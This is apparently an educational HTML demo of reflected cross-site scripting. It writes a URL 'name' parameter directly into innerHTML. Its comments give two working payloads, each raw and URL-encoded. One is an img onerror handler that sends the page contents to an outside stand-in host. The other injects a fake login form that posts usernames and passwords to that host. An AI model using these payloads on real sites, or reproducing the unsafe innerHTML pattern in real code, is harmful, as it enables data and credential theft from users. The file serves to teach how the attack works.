<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
  </head>
  <body>
    <!-- Vulnerable Code -->
    <div>Welcome, <span id="username"></span>!</div>

    <script>
      // Function to set a cookie, mostly this will be set from server
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
      }

      // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
      setCookie("exampleCookie", "Hello, Cookie!", 7);
    </script>

    <!-- Vulnerable Code -->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");

      /*
      STEALING CRITICAL INFORMATION:
      There is a possibility that we can steal all the information that you are able to see on the webpage.
      For an example, You are using the app that has vulnerable code, we can read all the data you see on the web page.
      Lets understand how is this possible...
      <img src="empty.gif" onerror="var mycookie = document.cookie; new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;"/>
      
      ENCODED FORMAT:
      ?name=%3Cimg%20src%3D%22empty.gif%22%20onerror%3D%22var%20mycookie%20%3D%20document.cookie%3B%20new%20Image().src%3D%60https%3A%2F%2Fexample.com%2Ffakepage.php%3Foutput%3D%24%7Bdocument.body.innerHTML%7D%60%3B%22%2F%3E
      
      By entering this we can access all the HTML page that is loaded.

      Let's try to inject a form, and try to get access to their website credentials...

      INJECT A FORM:
      <h3>Please Login to proceed</h3><Form action="http://example.com/fakepage.php">UserName: <br/> <input type="text" name="username"/></br>Password: <br/> <input type="password" name="password"/><br/><input type="submit" value="Login"/></Form>
      ENCODED FORMAT:
      ?name=%3Ch3%3EPlease%20Login%20to%20proceed%3C%2Fh3%3E%3CForm%20action%3D%22http%3A%2F%2Fexample.com%2Ffakepage.php%22%3EUserName%3A%20%3Cbr%2F%3E%20%3Cinput%20type%3D%22text%22%20name%3D%22username%22%2F%3E%3C%2Fbr%3EPassword%3A%20%3Cbr%2F%3E%20%3Cinput%20type%3D%22password%22%20name%3D%22password%22%2F%3E%3Cbr%2F%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%2F%3E%3C%2FForm%3E

      Once you enter this, you will be able to see a form on the webpage. and thats it if the user enters the credentials, 
      attacker will have access to the creedentials.
      */
      document.getElementById("username").innerHTML = name;
    </script>
  </body>
</html>
